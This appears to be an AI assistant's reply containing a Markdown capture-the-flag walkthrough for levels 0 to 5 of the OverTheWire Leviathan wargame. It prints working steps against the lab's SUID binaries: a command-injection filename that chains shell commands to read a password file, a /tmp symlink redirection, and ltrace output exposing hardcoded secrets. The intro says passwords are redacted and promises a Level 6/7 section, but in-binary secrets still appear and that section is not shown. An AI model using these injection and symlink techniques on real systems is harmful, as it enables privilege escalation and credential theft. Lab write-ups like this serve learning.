Yahan **`02-leviathan.md`** ke liye highly professional, deeply technical, aur SEO-optimized master walkthrough file hai.

Aapke tamam levels ko clean architectural breakdown, ASCII diagrams, command traces, aur key takeaways ke sath format kar diya gaya hai. **Tamam passwords ko redact (`[REDACTED_PASSWORD]`) kar diya gaya hai** aur Level 6/7 ke liye clean placeholder section add kar diya gaya hai taake aap baad me aasaani se add kar sakein:

---

### 📄 File Name: 
`02-leviathan.md`  
*(Path: `IW-Core-Tracks/05-wargames-and-ctfs/01-overthewire/02-leviathan.md`)*

Yahan complete Markdown code hai:

```markdown
<!-- 
SEO METADATA & KEYWORDS (Invisible to readers, visible to Google Crawlers)
Keywords: IW Cyber Ops, Muhammad Imran Wakeel, OverTheWire Leviathan Solutions, Leviathan Wargame Walkthrough, Linux Privilege Escalation, ltrace Dynamic Tracing, strace System Calls, SUID Binary Exploitation, Symlink Attacks, Command Injection in C, access vs system, Reverse Engineering Wargames, Cybersecurity Knowledge Base.
-->

# 🐉 OverTheWire Leviathan — Complete Tactical Walkthrough

> **Platform:** OverTheWire Wargames (`leviathan`)  
> **Target Host:** `leviathan.labs.overthewire.org` (Port: `2223`)  
> **System Operator & Lead Researcher:** Muhammad Imran Wakeel (`@iwcyberops`)  
> **Mission Scope:** Deconstruct Linux binary logic flaws, dynamic library call interception, file descriptor redirection, and local privilege escalation.

---

## 🧭 Operational Overview

The **Leviathan** wargame marks the critical transition from pure Linux command-line administration into **Binary Logic Auditing and Local Privilege Escalation (LPE).**

Unlike standard file-hunting exercises, Leviathan presents custom compiled SUID executables running with elevated user privileges. To capture the next level credentials stored inside `/etc/leviathan_pass/`, an operator must inspect binaries without source code, trace dynamic library calls (**`ltrace`**), intercept system calls (**`strace`**), bypass filename validation checks, weaponize symbolic links (**`ln -s`**), and decode raw bitstreams directly inside the terminal.

---

## 📋 Challenge Level Progression

```
  ┌─────────────────────────────────────────────────────────────────────────┐
  │                    LEVIATHAN ATTACK VECTOR MAPPING                      │
  └────────────────────────────────────┬────────────────────────────────────┘
                                       │
      ┌────────────────────────────────┼────────────────────────────────┐
      │                                │                                │
┌─────▼───────────────┐     ┌──────────▼──────────┐     ┌───────────────▼─────┐
│ 1. DATA MINING &    │     │ 2. DYNAMIC TRACING  │     │ 3. SUID LOGIC &     │
│    STREAM DECODING  │     │    & STRCMP LEAKS   │     │    SYMLINK HIJACKS  │
│  (Level 0, Level 4) │     │  (Level 1, Level 3) │     │  (Level 2, Level 5) │
└─────────────────────┘     └─────────────────────┘     └─────────────────────┘
```

---

### 🚩 Level 0 ➔ Level 1: Hidden Configuration Mining

* **Connection Target:** `ssh leviathan0@leviathan.labs.overthewire.org -p 2223`
* **Core Vulnerability / Concept:** Unsecured browser configuration files, data exposure in hidden directories.
* **Target Environment:** Standard user home directory.

#### 💻 Technical Analysis & Execution:
Enumerating hidden files revealed a `.backup` directory containing browser data:

```bash
# Step 1: Enumerate hidden directories
ls -la

# Step 2: Navigate and inspect contents
cd .backup
ls -la

# Step 3: Inspect file size and line count
wc -l bookmarks.html

# Step 4: Extract the password using case-insensitive regex filtering
grep -i "password" bookmarks.html
```

* **🔑 Extracted Artifact:** `[REDACTED_PASSWORD_TOKEN]`
* **💡 Tactical Takeaway:** Sensitive application artifacts (like browser bookmarks or session history) often store credentials in plaintext inside hidden home directories.

---

### 🚩 Level 1 ➔ Level 2: Intercepting `strcmp` via Dynamic Library Tracing

* **Connection Target:** `ssh leviathan1@leviathan.labs.overthewire.org -p 2223`
* **Core Vulnerability / Concept:** Hardcoded string comparison in memory, dynamic library call tracing (`ltrace`).
* **Target Binary:** `./check` (SUID executable).

#### 💻 Technical Analysis & Execution:
Executing `./check` prompted for a password and failed. Using `ltrace` allowed dynamic interception of the `strcmp()` library call during runtime execution:

```bash
# Step 1: Trace library calls while providing dummy input
ltrace ./check
```

```text
__libc_start_main(["./check"] <unfinished ...>
printf("password: ")                                             = 10
getchar()                                                        = 49
getchar()                                                        = 10
strcmp("1\n", "sex")                                            = -1
puts("Wrong password, Good Bye ...")                             = 29
+++ exited (status 0) +++
```

`ltrace` exposed that user input is directly evaluated against the static string `"sex"`. Providing the exact string spawns an elevated shell:

```bash
# Step 2: Execute with the leaked password
./check
# [Input: sex]

# Step 3: Spawns /bin/sh -> Elevate to bash and read credential
cat /etc/leviathan_pass/leviathan2
```

* **🔑 Extracted Artifact:** `[REDACTED_PASSWORD_TOKEN]`
* **💡 Tactical Takeaway:** Binaries compiled without anti-debugging protections leak plaintext comparison buffers directly to user-space library tracers (`ltrace`).

---

### 🚩 Level 2 ➔ Level 3: `access()` vs. `system()` Command Injection

* **Connection Target:** `ssh leviathan2@leviathan.labs.overthewire.org -p 2223`
* **Core Vulnerability / Concept:** Discrepancy between filename validation (`access()`) and command execution (`system()`), shell parameter injection via `;`.
* **Target Binary:** `~/printfile` (SUID executable).

#### 💻 Exploitation Architecture:

```text
User Input: "this;cd ..;cd etc;cd leviathan_pass;cat leviathan3"
                          │
                          ▼
  ┌─────────────────────────────────────────────────┐
  │ access(filename, R_OK)                          │ <-- Checks single filename (Passes)
  └───────────────────────┬─────────────────────────┘
                          │
                          ▼
  ┌─────────────────────────────────────────────────┐
  │ snprintf(cmd, 511, "/bin/cat %s", filename)     │ <-- Concatenates raw string
  └───────────────────────┬─────────────────────────┘
                          │
                          ▼
  ┌─────────────────────────────────────────────────┐
  │ system(cmd)                                     │ <-- Executes under /bin/sh
  └───────────────────────┬─────────────────────────┘
                          │
       ┌──────────────────┴──────────────────┐
       ▼                                     ▼
/bin/cat this                        cd ..; cd etc; cd leviathan_pass; cat leviathan3
(Fails gracefully)                   (Executes with elevated SUID privileges)
```

#### 💻 Technical Analysis & Execution:
Tracing `printfile` revealed that it verifies read permissions via `access()` and then builds a shell command executed through `system()`:

```bash
# Step 1: Observe command construction via ltrace
ltrace ~/printfile /etc/hostname
```

```text
access("/etc/hostname", 4)                                       = 0
snprintf("/bin/cat /etc/hostname", 512, "/bin/cat %s", "/etc/hostname") = 23
system("/bin/cat /etc/hostname")
```

Because `system()` invokes `/bin/sh`, shell metacharacters like `;` allow arbitrary command chaining. We craft a filename that passes `access()` and injects directory traversal to read the protected password file:

```bash
# Step 2: Create the payload filename in /tmp
cd /tmp
touch "this;cd ..;cd etc;cd leviathan_pass;cat leviathan3"

# Step 3: Execute directly WITHOUT ltrace (to retain SUID root privileges)
~/printfile "this;cd ..;cd etc;cd leviathan_pass;cat leviathan3"
```

* **🔑 Extracted Artifact:** `[REDACTED_PASSWORD_TOKEN]`
* **💡 Tactical Takeaway:** Tracing SUID binaries via `ptrace`/`ltrace` drops elevated effective permissions (`EUID`). Exploits must be executed directly in the shell to retain privilege elevation.

---

### 🚩 Level 3 ➔ Level 4: Trailing Newline Analysis in `fgets()` & Shell Spawning

* **Connection Target:** `ssh leviathan3@leviathan.labs.overthewire.org -p 2223`
* **Core Vulnerability / Concept:** Hardcoded password evaluation with `fgets()` newline retention (`\n`), automatic SUID shell spawning via `setreuid()`.
* **Target Binary:** `./level3` (SUID executable).

#### 💻 Technical Analysis & Execution:
Executing `ltrace` on `./level3` reveals a dynamic password comparison:

```bash
# Step 1: Trace library execution
ltrace ./level3
```

```text
strcmp("h0no33", "kakaka")                                       = -1
printf("Enter the password> ")                                   = 20
fgets("hello\n", 256, 0xf7fc55a0)                                = 0xffffd50c
strcmp("hello\n", "snlprintf\n")                                 = -1
puts("bzzzzzzzzap. WRONG")                                       = 19
```

`fgets()` retains the trailing newline (`\n`) character when reading from standard input. The internal target password is `"snlprintf"`:

```bash
# Step 2: Run executable with the correct secret
./level3
# Enter the password> snlprintf

# Output:
# [You've got shell]!
# $

# Step 3: Extract password from the spawned shell
cat /etc/leviathan_pass/leviathan4
```

* **🔑 Extracted Artifact:** `[REDACTED_PASSWORD_TOKEN]`
* **💡 Tactical Takeaway:** `fgets()` includes `\n` in its destination buffer, which must match the comparison string exactly. Once matched, the binary escalates privileges via `setreuid(geteuid(), geteuid())` before invoking `system("/bin/sh")`.

---

### 🚩 Level 4 ➔ Level 5: Raw Binary-to-ASCII Bitstream Decoding

* **Connection Target:** `ssh leviathan4@leviathan.labs.overthewire.org -p 2223`
* **Core Vulnerability / Concept:** Unprotected binary bitstream output, stream conversion using Perl bit packing.
* **Target Binary:** `.trash/bin`

#### 💻 Technical Analysis & Execution:
Navigating into the hidden `.trash` directory reveals a binary executable emitting raw binary bits (`01100001...`):

```bash
# Step 1: Locate and execute the hidden binary
cd .trash
./bin
```

Instead of using external web converters, the binary stream is piped directly into a native Perl one-liner for real-time byte reconstruction:

```bash
# Step 2: Pack 8-bit binary stream into ASCII text
./bin | perl -0777 -pe 's/\s+//g; $_=pack("B*", $_)'
```

* **Perl Flag Breakdown:**
  * `-0777`: Slurps entire input into memory as a single string.
  * `-p`: Automatically prints output after script execution.
  * `-e`: Executes inline Perl expression.
  * `s/\s+//g`: Strips all whitespace and newline characters.
  * `pack("B*", $_)`: Converts high-order bitstring into ASCII characters.

* **🔑 Extracted Artifact:** `[REDACTED_PASSWORD_TOKEN]`
* **💡 Tactical Takeaway:** Terminal agility requires knowing how to convert binary representations (`Base-2`, `Hex`, `Base64`) natively on command-line systems without external utilities.

---

### 🚩 Level 5 ➔ Level 6: Predictable Temporary File Symlink Exploitation

* **Connection Target:** `ssh leviathan5@leviathan.labs.overthewire.org -p 2223`
* **Core Vulnerability / Concept:** Predictable static file path (`/tmp/file.log`), symbolic link redirection attack (`ln -s`).
* **Target Binary:** `~/leviathan5` (SUID executable).

#### 💻 Exploitation Architecture:

```text
/tmp/file.log  ──────(Symbolic Link)──────►  /etc/leviathan_pass/leviathan6
     ▲
     │
┌────┴──────────────────────────┐
│ ~/leviathan5 (SUID Binary)    │
│  - fopen("/tmp/file.log", "r")│ <-- Opens symlink targets
│  - fgetc() & putchar() loop   │ <-- Prints protected contents character-by-character
│  - unlink("/tmp/file.log")    │ <-- Cleans up file pointer
└───────────────────────────────┘
```

#### 💻 Technical Analysis & Execution:
Tracing the binary reveals that it reads a hardcoded file path (`/tmp/file.log`), prints its contents character-by-character using `fgetc()`/`putchar()`, and unlinks the file:

```bash
# Step 1: Trace execution with ltrace
ltrace ~/leviathan5
```

```text
fopen("/tmp/file.log", "r")                                      = 0
puts("Cannot find /tmp/file.log")                                = 26
```

Because `/tmp` is world-writable, we create a symbolic link named `/tmp/file.log` pointing directly to the target password file:

```bash
# Step 2: Create the symbolic link pointer
ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log

# Step 3: Trigger the SUID binary to read through the symlink
~/leviathan5
```

* **🔑 Extracted Artifact:** `[REDACTED_PASSWORD_TOKEN]`
* **💡 Tactical Takeaway:** Privileged binaries must never operate on static, predictable paths in public temporary directories (`/tmp`) without verifying symlink ownership or using `O_NOFOLLOW` flags.
